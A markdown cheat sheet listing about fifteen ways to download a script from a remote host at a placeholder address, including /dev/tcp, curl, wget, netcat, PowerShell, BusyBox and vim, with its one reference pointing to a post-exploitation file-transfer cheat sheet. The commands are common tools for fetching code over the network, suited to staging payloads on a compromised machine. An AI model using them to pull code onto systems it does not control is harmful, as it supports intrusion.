# Downloading a file with different tools

Below are multiple client-side methods to download a script (`script.sh`) from a remote server. Replace `<ip>` (and `<user>`, `<password>`, `/path/to/`) as appropriate.

1. **Using File Descriptors in Shell**

   If you don’t have common tools like `wget`, `curl`, `python3`, `nc`, or
   `scp`, you can still fetch a script using shell file descriptors with
   `/dev/tcp`.

   ```bash
   exec 3<>/dev/tcp/<ip>/<port>
   echo -e "GET /script.sh HTTP/1.0\r\nHost: <ip>\r\n\r\n" >&3
   cat <&3 | sed '1,/^\r$/d' > script.sh
   ```

1. **Using `python3`**

   ```bash
   python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<ip>:<port>/script.sh", "script.sh")'
   ```

1. **Using `wget`**

   ```bash
   wget http://<ip>:<port>/script.sh -O script.sh
   ```

1. **Using `curl`**

   ```bash
   curl http://<ip>:<port>/script.sh -o script.sh
   ```

1. **Using `nc` (netcat)**

   ```bash
   nc <ip> <port> > script.sh
   ```

1. **Using `scp`**

   ```bash
   scp user@<ip>:/path/to/script.sh ./script.sh
   ```

1. **Using Perl (stdlib: HTTP::Tiny)**

   ```bash
   perl -MHTTP::Tiny -e 'HTTP::Tiny->new->mirror("http://<ip>:<port>/script.sh","script.sh")'
   ```

1. **Using FTP (interactive)**

   ```bash
   ftp <ip>
   # In FTP prompt:
   # user <username> <password>
   # get script.sh
   # bye
   ```

1. **Using `lftp` (scripted FTP)**

   ```bash
   lftp -e "get script.sh; bye" -u <user>,<password> ftp://<ip>
   ```

1. **Using `rsync`**

   ```bash
   rsync user@<ip>:/path/to/script.sh ./script.sh
   ```

1. **Using PowerShell (Windows)**

   ```powershell
   Invoke-WebRequest -Uri "http://<ip>:<port>/script.sh" -OutFile "script.sh"
   ```

1. **Using BusyBox (`wget` or `nc`)**

   ```bash
   busybox wget http://<ip>:<port>/script.sh -O script.sh
   ```
   or
   ```bash
   busybox nc <ip> <port> > script.sh
   ```

1. **Using `fetch` (BSD)**

   ```bash
   fetch http://<ip>:<port>/script.sh
   ```

1. **Using `telnet` (manual HTTP GET)**

   ```bash
   telnet <ip> <port>
   # Then type:
   # GET /script.sh HTTP/1.0
   # Host: <ip>
   # (Press Enter twice)
   # Copy the response body manually to script.sh
   ```

1. Using `vim`:

   ```vim
   :e http://<your-ip>:<port>/filename
   :w filename
   ```

## References

https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
